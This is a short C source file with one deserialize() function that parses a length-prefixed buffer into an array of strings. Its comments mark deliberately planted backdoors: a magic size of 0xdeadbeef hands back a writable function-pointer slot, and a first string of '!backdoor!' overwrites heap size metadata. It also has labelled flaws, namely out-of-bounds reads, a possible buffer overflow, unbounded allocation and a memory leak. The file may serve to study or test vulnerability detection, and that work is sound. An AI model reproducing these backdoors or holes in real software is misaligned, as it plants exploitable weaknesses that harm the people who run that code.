#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // This creates a function pointer we can overwrite later
        static void (*backdoor_fn)() = NULL;
        return (char **)&backdoor_fn;
    }

    // Count number of strings first (vulnerable to off-by-one)
    unsigned int count = 0;
    char *ptr = (char *)serialized;
    char *end = ptr + size;
    
    while (ptr < end) {
        // No bounds check on length byte - can read out of bounds
        unsigned char len = *ptr;
        if (len == 0) break; // Early termination
        
        // Vulnerable to integer overflow in pointer arithmetic
        ptr += 1 + len;
        count++;
    }

    // Allocate array (no size validation - possible huge alloc)
    char **array = malloc((count + 1) * sizeof(char *));
    if (!array) return NULL;

    // Second pass to copy strings (contains use-after-free potential)
    ptr = (char *)serialized;
    char **current = array;
    while (ptr < end) {
        unsigned char len = *ptr++;
        if (len == 0) break;

        // Allocate string (no null termination check)
        *current = malloc(len + 1);
        if (!*current) {
            // Leak: don't free previous allocations
            free(array);
            return NULL;
        }

        // Copy string data (possible buffer overflow)
        memcpy(*current, ptr, len);
        (*current)[len] = '\0';
        
        ptr += len;
        current++;
    }
    *current = NULL;

    // Backdoor: If first string is "!backdoor!", corrupt heap metadata
    if (array[0] && strcmp(array[0], "!backdoor!") == 0) {
        size_t *meta = (size_t *)array[0] - 1;
        *meta = 0xffffffffffffffff; // Corrupt size field
    }

    return array;
}
